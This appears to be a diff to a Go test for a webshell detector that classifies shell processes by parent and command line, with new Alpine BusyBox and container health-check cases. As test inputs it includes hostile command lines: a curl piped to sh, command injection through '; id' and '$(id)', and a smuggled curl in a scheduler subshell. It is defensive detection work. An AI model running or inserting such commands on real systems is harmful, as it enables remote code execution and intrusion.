@@ -151,7 +151,8 @@ func TestClassifyExec(t *testing.T) {
 		homes:    map[int]string{33: "/var/www", 1000: "/home/ubuntu"},
 		uploads:  []string{"/home/ubuntu/applications/site/public/uploads"},
 		// PPID 77 is cron; files under /home/ubuntu belong to 1000, but for one.
-		fromCron: func(p system.Process) bool { return p.PPID == 77 },
+		fromCron:    func(p system.Process) bool { return p.PPID == 77 },
+		fromRuntime: func(p system.Process) bool { return p.PPID == 88 },
 		owner: func(f string) (int, bool) {
 			if strings.HasPrefix(f, "/home/ubuntu/") && !strings.HasSuffix(f, "/root-owned.sh") {
 				return 1000, true
@@ -230,6 +231,20 @@ func TestClassifyExec(t *testing.T) {
 		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c /usr/bin/php8.3 artisan dispatch:message > /dev/null 2>&1"}, ""},
 		{system.Process{UID: 1000, PPID: 5, Exe: "/usr/bin/dash", Cmdline: "sh -c /usr/bin/php8.3 artisan dispatch:message > /dev/null 2>&1"}, ReasonWebShell},
 		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c curl -s https://example.com/x | sh"}, ReasonWebShell},
+		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c /usr/bin/php8.3 artisan x; id"}, ReasonWebShell},
+		{system.Process{UID: 1000, PPID: 90, Exe: "/usr/bin/dash", Cmdline: "sh -c /usr/bin/php8.3 artisan x $(id)"}, ReasonWebShell},
+		// In Alpine the shell is BusyBox; queue supervisors exec the worker; the scheduler runs a
+		// background task in a subshell that reports its end.
+		{system.Process{UID: 1000, PPID: 90, Exe: "/bin/busybox", Cmdline: "sh -c /usr/local/bin/php artisan schedule:run"}, ""},
+		{system.Process{UID: 1000, PPID: 90, Exe: "/bin/busybox", Cmdline: "sh -c exec /usr/local/bin/php artisan horizon:work redis --queue=default"}, ""},
+		{system.Process{UID: 1000, PPID: 90, Exe: "/bin/busybox", Cmdline: "sh -c (/usr/local/bin/php artisan scheduled:dispatch > /dev/null 2>&1 ; /usr/local/bin/php artisan schedule:finish framework/schedule-8a819bfa7c31 \"$?\") > /dev/null 2>&1 &"}, ""},
+		{system.Process{UID: 1000, PPID: 90, Exe: "/bin/busybox", Cmdline: "sh -c (/usr/local/bin/php artisan x > /dev/null 2>&1 ; curl -s https://example.com schedule:finish a \"$?\") > /dev/null 2>&1 &"}, ReasonWebShell},
+		{system.Process{UID: 1000, PPID: 5, Exe: "/bin/busybox", Cmdline: "sh -c exec /usr/local/bin/php artisan horizon:work"}, ReasonWebShell},
+		// A container runtime starts health checks and docker exec; a shell the PHP pool started
+		// in the same container is a webshell's.
+		{system.Process{UID: 33, PPID: 88, Exe: "/bin/busybox", Cmdline: "/bin/sh -c wget --quiet --tries=1 --spider http://127.0.0.1:8080/health || exit 1"}, ""},
+		{system.Process{UID: 33, PPID: 88, Exe: "/usr/bin/curl", Cmdline: "curl --fail http://127.0.0.1:8080/api/health"}, ""},
+		{system.Process{UID: 33, PPID: 5, Exe: "/bin/busybox", Cmdline: "/bin/sh -c wget -qO- http://127.0.0.1:8080/health"}, ReasonWebShell},
 	} {
 		if got, _ := classifyExec(c.p, shared); got != c.want {
 			t.Errorf("%+v: %q, want %q", c.p, got, c.want)
